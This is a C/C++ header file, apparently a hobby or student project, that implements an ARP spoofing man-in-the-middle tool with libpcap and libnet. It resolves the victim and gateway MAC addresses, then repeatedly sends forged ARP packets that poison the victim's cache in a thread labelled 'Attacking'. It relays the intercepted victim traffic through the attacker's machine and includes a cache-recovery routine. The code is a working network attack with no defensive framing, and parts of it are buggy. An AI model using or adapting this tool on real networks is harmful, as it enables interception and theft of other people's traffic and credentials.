#ifndef ARP_HPP
#define ARP_HPP
#ifndef ARP_H
#define ARP_H

struct arp_hdr
{
    u_int16_t  hard_type;
    u_int16_t  protocol_type;
    u_int8_t  hard_size;
    u_int8_t  protocol_size;
    u_int16_t  opcode;
    u_int8_t  sendmac[6];
    u_int8_t   sendip[4];
    u_int8_t  targetmac[6];
    u_int8_t  targetip[4];
};

void Call_Device(char **C_dev);
int  Pcap_init(char **P_dev, pcap_t **P_handle);
void IntoIP(char **contain , char **ip);
int Lib_init(libnet_t **L_libhandle,char **L_dev);
int Get_Mac(libnet_ether_addr **G_contain, libnet_t **G_libhandle);
void Input_Dst_Mac(u_int8_t **I_dst_mac);
void Set_Ether(u_int8_t *S_buf, u_int8_t **S_dst,libnet_ether_addr **S_mymac);
void IpInit(char **I_ip,  in_addr_t **I_hex);
void Set_Arp(u_int8_t *S_buf, libnet_ether_addr **S_smac, in_addr_t **S_sip, u_int8_t **S_tmac, in_addr_t **S_tip);
bool Get_Dst_Mac(const u_char *p_pointer);
bool Get_Gate_Mac(const u_char *p_pointer);
void Attack_Seting();
void *Attack_Start(void *);
void *Relay_Start(void *);
void Relay_Seting();
void Start_Arp();
void Stop_Arp();
void Recovery_Arp();
void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

pcap_t *handle;
libnet_t *lib_handle, *infect_packet;
char *dev;
char *Send, *Rec, *Gate;
u_int8_t Buf[sizeof(libnet_ethernet_hdr)+sizeof(arp_hdr)]={0,};
in_addr_t *Sender_Hex_Ip, *Receiver_Hex_Ip, *Gate_Hex_IP;
int Mac_len2;
libnet_ether_addr *My_Mac;
u_int8_t *Dst_Mac, *Gate_Mac;
struct pcap_pkthdr header;
const u_char *p;
pthread_t Attack_handle,Relay_handle;
int arp_set=0;
bool f1=true,f2=true,f3=true;
char *Broadcast="ff:ff:ff:ff:ff:ff";


void Call_Device(char **C_dev)
{
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int i=0;
    char Select_device[10];
    char errbuf[PCAP_ERRBUF_SIZE];

    /* Retrieve the device list */
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
    /* Print the list */
    for(d=alldevs;d;d=d->next)
        printf("%d. %s \n", ++i, d->name);

    if(i==0)
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
    printf("\nSelect Device: ");
    scanf("%s",&Select_device);

    *C_dev=Select_device;

    /* We don't need any more the device list. Free it */
    pcap_freealldevs(alldevs);
}


int  Pcap_init(char **P_dev, pcap_t ** P_handle)
{
    char pcap_errbuf[PCAP_ERRBUF_SIZE];

    if((*P_handle=pcap_open_live(*P_dev,BUFSIZ,1,1000,pcap_errbuf))==NULL)//Handle Open!
    {
        printf("Pcap_Open_Live Error!!!\n");
        return 1;
    }

    printf("\t\t\t\t\t\t\t\t  Pcap_Open_Live \t\t\t\t\t\t\t\t\t    <OK>\n");
}


void IntoIP(char **contain , char **ip)
{
    *contain=(*ip);
}

int Lib_init(libnet_t **L_libhandle, char **L_dev)
{

    char *lib_errbuf[LIBNET_ERRBUF_SIZE];

    *L_libhandle = libnet_init(LIBNET_LINK, *L_dev, *lib_errbuf);
    if (*L_libhandle == NULL)
    {
        printf("Lib_handle Erorr!!\n");
        return 1;
    }
    printf("\n\t\t\t\t\t\t\t      Libnet_Handle_Init \t\t\t\t\t\t\t\t\t    <OK>\n");
}

int Get_Mac(libnet_ether_addr ** G_contain, libnet_t **G_libhandle)
{
    * G_contain=libnet_get_hwaddr(*G_libhandle);
    if(*G_contain == NULL)
    {
        printf("Get_Mac Error!!");
        return 1;
    }
}

void Input_Dst_Mac(u_int8_t **I_dst_mac)
{
    u_int8_t Des_Mac[18];
    int Mac_len;
    //   printf("Destination Mac: ");
    //   scanf("%s",Des_Mac);
    *I_dst_mac=libnet_hex_aton(Broadcast,&Mac_len);
}

void Set_Ether(u_int8_t *S_buf, u_int8_t **S_dst,libnet_ether_addr ** S_mymac)
{
    memcpy(S_buf,*S_dst,6);
    memcpy(S_buf+6,* S_mymac,6);
    memset(S_buf+12,0x08,1);
    memset(S_buf+13,0x06,1);

}

void Set_Arp(u_int8_t *S_buf, libnet_ether_addr **S_smac, in_addr_t **S_sip, u_int8_t **S_tmac, in_addr_t **S_tip)
{
    arp_hdr ap;
    ap.hard_type=htons(0x0001);
    ap.protocol_type=htons(0x0800);
    ap.hard_size=0x06;
    ap.protocol_size=0x04;
    ap.opcode=htons(0x0001);
    memcpy(ap.sendmac,*S_smac,sizeof(libnet_ether_addr));
    memcpy(ap.sendip,*&S_sip,sizeof(in_addr_t));
    memset(ap.targetmac,0x00,6);
    memcpy(ap.targetip,*&S_tip,sizeof(in_addr_t));
    memcpy(S_buf+sizeof(libnet_ethernet_hdr),&ap,sizeof(ap));
}

void IpInit(char **I_ip,  in_addr_t ** I_hex)
{
    sockaddr_in s;
    inet_aton(*I_ip,&s.sin_addr);
    *I_hex = (in_addr_t *)s.sin_addr.s_addr;
}

bool Get_Dst_Mac(const u_char *p_pointer)
{
    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p_pointer;
    if(ntohs(p_ether->ether_type)==ETHERTYPE_ARP)//0x0800
    {
        arp_hdr *p_arp = (arp_hdr *)(p_pointer+sizeof(libnet_ethernet_hdr));
        if(ntohs(p_arp->hard_type)==0x0001 && ntohs(p_arp->protocol_type)==ETHERTYPE_IP && ntohs(p_arp->opcode)==ARPOP_REPLY) {
            // Dst_Mac=p_arp->sendmac;
            Dst_Mac = (u_int8_t*)malloc(6);
            memcpy(Dst_Mac, p_arp->sendmac, 6);
            return true;
        }
    }
    return false;
}

bool Get_Gate_Mac(const u_char * p_pointer)
{
    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p_pointer;
    if(ntohs(p_ether->ether_type)==ETHERTYPE_ARP)//0x0800
    {
        arp_hdr *p_arp = (arp_hdr *)(p_pointer+sizeof(libnet_ethernet_hdr));
        if(ntohs(p_arp->hard_type)==0x0001 && ntohs(p_arp->protocol_type)==ETHERTYPE_IP && ntohs(p_arp->opcode)==ARPOP_REPLY) {
            // Gate_Mac=p_arp->sendmac;
            Gate_Mac = (u_int8_t*)malloc(6);
            memcpy(Gate_Mac, p_arp->sendmac, 6);
            return true;
        }
    }
    return false;
}

void Attack_Seting()
{
    memcpy(Buf,Dst_Mac,6);
    memcpy(Buf+6,My_Mac,6);
    memcpy(Buf+22,My_Mac,6);
    memcpy(Buf+28,&Gate_Hex_IP,4);
    memcpy(Buf+32,Dst_Mac,6);
    memcpy(Buf+38,&Receiver_Hex_Ip,4);
  // for(int q=0;q<42;q++)
  //       printf("%x ",Buf[q]);

}
void Start_Arp()
{
    f1=false;
    f2=true;
    f3=true;
    Attack_Seting();
    pthread_create(&Attack_handle,NULL,&Attack_Start,NULL);
}

void Stop_Arp()
{
    f2=false;
    f1=true;
    f3=true;
    system("clear");
    printf("\n***************Stop!!***************\n");
    pthread_cancel(Relay_handle);
    pthread_cancel(Attack_handle);
}


void Recovery_Arp()
{
    f3=false;
    f1=true;
    f2=true;

    pthread_cancel(Relay_handle);
    pthread_cancel(Attack_handle);

    system("clear");
    printf("\n***************Recovery!!***************\n");

    memset(Buf,0xff,6);
    memcpy(Buf+6,My_Mac,6);
    memcpy(Buf+22,Dst_Mac,6);
    memcpy(Buf+28,&Receiver_Hex_Ip,4);
    memset(Buf+32,0x00,6);
    memcpy(Buf+38,&Gate_Hex_IP,4);
    pcap_sendpacket(handle,Buf,sizeof(Buf));
  // for(int q=0;q<42;q++)
  //    printf("%x ",Buf[q]);
  //  printf("Recovery_Function!!\n");
}

void *Attack_Start(void*)
{
    //int a=0;
    system("clear");
    printf("\n***************Attacking...***************\n");
    Relay_Seting();
    while (1)
    {
        pcap_sendpacket(handle,Buf,sizeof(Buf));
        sleep(1);
        //printf("%d\n",a++);
    }
}


void Relay_Seting()
{
    pthread_create(&Relay_handle,NULL,&Relay_Start,NULL);
}

void *Relay_Start(void *)
{
    pcap_loop(handle, -1, p_packet, NULL);
}


void p_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *p)
{
    libnet_ethernet_hdr * p_ether = (libnet_ethernet_hdr *)p;

    if(ntohs(p_ether->ether_type)==ETHERTYPE_IP)//0x0800
    {
        libnet_ipv4_hdr * p_ip = (libnet_ipv4_hdr *)(p+sizeof(libnet_ethernet_hdr));

        if(memcmp(p_ether->ether_shost,Dst_Mac,6)==0) //Victim Pakcet
        {
            memcpy(p_ether->ether_dhost,Gate_Mac,6);
            memcpy(p_ether->ether_shost,My_Mac,6);
            pcap_sendpacket(handle,p,header->len);
        }

        if(memcmp(p_ether->ether_dhost,Gate_Mac,6)==0) //My Pakcet
        {
            memcpy(p_ether->ether_dhost,Gate_Mac,6);
            memcpy(p_ether->ether_shost,My_Mac,6);
            pcap_sendpacket(handle,p,header->len);
        }

    }
}



#endif // ARP_H
#endif // ARP_HPP

